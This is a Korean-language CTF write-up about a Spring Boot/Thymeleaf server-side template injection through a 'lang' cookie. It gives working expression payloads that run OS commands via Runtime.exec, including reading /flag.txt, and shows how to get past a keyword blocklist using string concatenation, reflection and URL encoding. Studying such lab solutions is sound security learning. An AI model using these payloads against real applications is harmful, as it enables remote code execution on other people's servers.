## 코드

```java
@GetMapping({"/"})
public String index(@RequestParam(value = "lang", required = false) String lang, Model model, HttpServletRequest request, HttpServletResponse response) {
    if (lang != null) {
        response.addCookie(new Cookie("lang", lang));
        return "redirect:/";
    } 
}

final String[] DANGEROUS_STRINGS = new String[] { "Runtime", "java", "class" };
```

```html
<!DOCTYPE HTML>
<html lang="en" xmlns:th="http://www.thymeleaf.org">
<head>
    <style>/* Create two equal columns that floats next to each other */
    .column {
      float: left;
      width: 50%;
    }
    /* Clear floats after the columns */
    .row:after {
      content: "";
      display: table;
      clear: both;
    }
    </style>
</head>
<body>
    <div th:fragment="main" class="row">
        <div class="column"><h3 th:text="'Hello, ' + ${message}"></h3></div>
        <div class="column" align="right"><a href="/?lang=en">en</a>/<a href="/?lang=ko">ko</a></div>
    </div>
    <a href="/welcome">Welcome</a>
    <a href="/signup">Singup</a>
    <a href="/signin">Singin</a>
</body>
</html>
```

## 풀이

```bash
$ unzip app.jar
```

BOOT-INF/에 들어가면 .class 파일들이 있고, jd-gui로 코드를 리버싱해서 봤다.

그 결과 html 파일에서 SSTI 취약점이 발생할 것 같은 느낌이 들었다.

Spring boot SSTI를 검색하면 ThymeleafView 관련 write-up이 나오고,

우리는 lang을 cookie에 설정해줄 수 있기 때문에,

cookies에다가 lang: 'query' 와 같이 injection을 할 수 있음을 알게 되었다.

Spring boot SSTI는 ${} 문법으로 진행할 수 있고,

```python
payload = '{7*7}'
query = f'__$%7b{payload}%7d__::.x'
```

까지는 쉽게 접근했다. 그리고 실행시키고자 하는 payload도 해당 write-up에서 찾을 수 있었다.

```python
payload = "new%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22id%22).getInputStream()).next()"
```

문제는 java, class, Runtime 키워드가 필터링된다는 것이다. 근데 나는 자바 알못이라서 이 필터링을 우회시키기 위한 방법을 몰랐다. 검색해도 잘 안나와서 풀이를 구매했더니 괴랄한 코드가 나왔다.

```python
payload = "T(Void).TYPE.forName(%22ja%22+%22va.util.Scanner%22).getConstructor(T(Void).TYPE.forName(%22ja%22+%22va.io.InputStream%22)).newInstance(T(Void).TYPE.forName(%22jav%22+%22a.lang.Run%22+%22time%22).getMethods()[6].invoke(null).exec(%22cat%20/flag.txt%22).getInputStream()).next()"
```

솔직히 이거는 자바 개고수나 할 수 있지 않을까 싶다.. 그래서 일단 플래그를 얻고 좀 더 쉬운 풀이를 찾아보니 url encoding을 알아냈다. url encoding인데 cookie에 넣어도 실행된다는게 아직도 이해는 안되지만(GET에서 url에 넣는 방식이었으면 몰라도) 아무튼 url encoding을 활용해서 문자열을 인코딩한 다음 이를 cookie에 넣어도 실행이 잘 되었다. 제일 간단한 코드는 다음과 같다.

```python
payload = "new%20j%61va.util.Scanner(T(j%61va.lang.Runtim%65).getRuntim%65().exec(%22id%22).getInputStream()).next()"
```

나머지는 검색으로 다 해결했는데, 마지막에 필터링 우회는 솔직히 어려웠다. 웹쪽에서 필터링 우회가 필요할 때에는 url encoding을 항상 염두에 두어야겠다.